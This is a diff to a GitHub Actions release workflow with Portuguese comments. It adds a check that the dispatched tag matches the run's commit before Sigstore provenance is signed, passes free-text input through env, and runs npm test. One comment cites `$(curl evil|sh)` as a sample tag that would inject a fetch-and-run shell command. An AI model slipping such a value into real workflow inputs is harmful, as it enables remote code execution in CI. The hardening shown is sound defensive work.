@@ -46,6 +46,29 @@ jobs:
           ref: ${{ github.event_name == 'workflow_dispatch' && format('refs/tags/{0}', inputs.tag) || github.ref_name }}
           persist-credentials: false
 
+      # A proveniência do Sigstore (actions/attest-build-provenance, mais
+      # abaixo) descreve o run do workflow em si (github.sha), não o ref
+      # feito checkout acima — normalmente coincidem, mas num
+      # workflow_dispatch corrido a partir de "main" com uma tag diferente
+      # no input, o conteúdo empacotado seria da tag e a proveniência
+      # assinada descreveria main: incoerência sem deteção. Falha cedo se
+      # isso acontecer, em vez de assinar uma proveniência errada.
+      - name: Confirmar tag == ref do run (workflow_dispatch)
+        if: github.event_name == 'workflow_dispatch'
+        # env, nunca ${{ }} direto no script: inputs.tag é texto livre
+        # (workflow_dispatch), e interpolar diretamente no run: é injeção
+        # de template (zizmor apanhou) — uma tag como `$(curl evil|sh)`
+        # corria como shell antes de qualquer validação.
+        env:
+          INPUT_TAG: ${{ inputs.tag }}
+          RUN_SHA: ${{ github.sha }}
+        run: |
+          checked_out="$(git rev-parse HEAD)"
+          if [ "$checked_out" != "$RUN_SHA" ]; then
+            echo "::error::A tag $INPUT_TAG (commit $checked_out) não corresponde ao commit em que este workflow foi corrido ($RUN_SHA). A proveniência Sigstore descreveria o commit errado. Corre de novo escolhendo a própria tag em 'Use workflow from'."
+            exit 1
+          fi
+
       - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0
         with:
           node-version: '24'
@@ -64,6 +87,7 @@ jobs:
         run: |
           npm ci --ignore-scripts
           npm run build
+          npm test
           tar -czf ../site-dist.tar.gz dist
 
       # SBOM (CycloneDX) do que está de facto instalado — mesmo padrão do
